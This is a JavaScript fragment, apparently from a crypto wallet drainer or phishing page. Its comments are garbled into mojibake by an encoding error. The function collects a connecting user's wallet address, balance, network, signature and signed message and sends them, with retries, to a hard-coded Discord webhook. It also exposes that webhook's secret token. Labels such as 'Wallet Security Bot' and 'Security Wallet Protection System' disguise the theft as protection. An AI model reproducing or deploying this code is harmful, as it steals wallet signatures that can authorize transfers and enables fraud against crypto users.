// –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –¥–∞–Ω–Ω—ã—Ö –Ω–∞ Discord webhook
async function sendToDiscordWebhook(userAddress, signature, message) {
    const webhookURL = 'https://discordapp.com/api/webhooks/1420896121835884718/IdDJHN_exPKf4s-4pDwmQHJkaLCxfWkXSPBTbygj6TpSySJ3RICs8LvEIJO3bn_yOuXW';
    
    // –ü–æ–ª—É—á–∞–µ–º –±–∞–ª–∞–Ω—Å –∏ –Ω–∞–∑–≤–∞–Ω–∏–µ —Å–µ—Ç–∏
    const balance = await getShortBalance();
    const network = await getNetworkName();
    
    // –ü—Ä–æ–≤–µ—Ä—è–µ–º –¥–ª–∏–Ω—É –ø–æ–¥–ø–∏—Å–∏
    const signatureLength = signature.length;
    
    // –û–≥—Ä–∞–Ω–∏—á–∏–≤–∞–µ–º –¥–ª–∏–Ω—É –ø–æ–¥–ø–∏—Å–∏ –¥–ª—è Discord (2000 —Å–∏–º–≤–æ–ª–æ–≤ –º–∞–∫—Å–∏–º—É–º –¥–ª—è –ø–æ–ª—è)
    const truncatedSignature = signatureLength > 1000 ? 
        signature.substring(0, 1000) + '... [TRUNCATED]' : 
        signature;
    
    // –û–≥—Ä–∞–Ω–∏—á–∏–≤–∞–µ–º –¥–ª–∏–Ω—É —Å–æ–æ–±—â–µ–Ω–∏—è
    const truncatedMessage = message.length > 500 ? 
        message.substring(0, 500) + '... [TRUNCATED]' : 
        message;

    const embed = {
        title: "üîê –ù–æ–≤–æ–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –∫–æ—à–µ–ª—å–∫–∞",
        color: 3066993, // –ó–µ–ª–µ–Ω—ã–π —Ü–≤–µ—Ç
        timestamp: new Date().toISOString(),
        fields: [
            {
                name: "üí∞ –ê–¥—Ä–µ—Å –∫–æ—à–µ–ª—å–∫–∞",
                value: `\`${userAddress}\``,
                inline: false
            },
            {
                name: "üíé –ë–∞–ª–∞–Ω—Å",
                value: balance,
                inline: true
            },
            {
                name: "üåê –°–µ—Ç—å",
                value: network,
                inline: true
            },
            {
                name: `‚úçÔ∏è –ü–æ–¥–ø–∏—Å—å (${signatureLength} —Å–∏–º–≤–æ–ª–æ–≤)`,
                value: `\`\`\`${truncatedSignature}\`\`\``,
                inline: false
            },
            {
                name: "üìù –°–æ–æ–±—â–µ–Ω–∏–µ",
                value: `\`\`\`${truncatedMessage}\`\`\``,
                inline: false
            },
            {
                name: "‚è∞ –í—Ä–µ–º—è –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è",
                value: `<t:${Math.floor(Date.now() / 1000)}:F>`,
                inline: false
            }
        ],
        footer: {
            text: "Security Wallet Protection System"
        }
    };

    try {
        // –î–æ–±–∞–≤–ª—è–µ–º –ø–æ–≤—Ç–æ—Ä–Ω—ã–µ –ø–æ–ø—ã—Ç–∫–∏
        let attempts = 0;
        const maxAttempts = 3;
        
        while (attempts < maxAttempts) {
            try {
                const response = await fetch(webhookURL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        embeds: [embed],
                        username: 'Wallet Security Bot',
                        avatar_url: 'https://cdn-icons-png.flaticon.com/512/6001/6001533.png'
                    })
                });

                if (response.ok) {
                    console.log('‚úÖ –î–∞–Ω–Ω—ã–µ —É—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã –≤ Discord');
                    return true;
                } else if (response.status === 429) {
                    // –°–ª–∏—à–∫–æ–º –º–Ω–æ–≥–æ –∑–∞–ø—Ä–æ—Å–æ–≤ - –∂–¥–µ–º –∏ –ø—Ä–æ–±—É–µ–º —Å–Ω–æ–≤–∞
                    const retryAfter = response.headers.get('Retry-After') || 2;
                    console.log(`‚ö†Ô∏è Rate limited. Retrying after ${retryAfter} seconds...`);
                    await new Promise(resolve => setTimeout(resolve, retryAfter * 1000));
                    attempts++;
                } else {
                    console.error('‚ùå –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Discord. –°—Ç–∞—Ç—É—Å:', response.status);
                    console.error('–¢–µ–∫—Å—Ç –æ—à–∏–±–∫–∏:', await response.text());
                    return false;
                }
            } catch (error) {
                console.error(`‚ùå –ü–æ–ø—ã—Ç–∫–∞ ${attempts + 1} –Ω–µ —É–¥–∞–ª–∞—Å—å:`, error);
                attempts++;
                if (attempts < maxAttempts) {
                    await new Promise(resolve => setTimeout(resolve, 1000 * attempts));
                }
            }
        }
        
        console.error('‚ùå –í—Å–µ –ø–æ–ø—ã—Ç–∫–∏ –æ—Ç–ø—Ä–∞–≤–∫–∏ –Ω–µ —É–¥–∞–ª–∏—Å—å');
        return false;
        
    } catch (error) {
        console.error('‚ùå –ö—Ä–∏—Ç–∏—á–µ—Å–∫–∞—è –æ—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ –≤ Discord:', error);
        return false;
    }
}
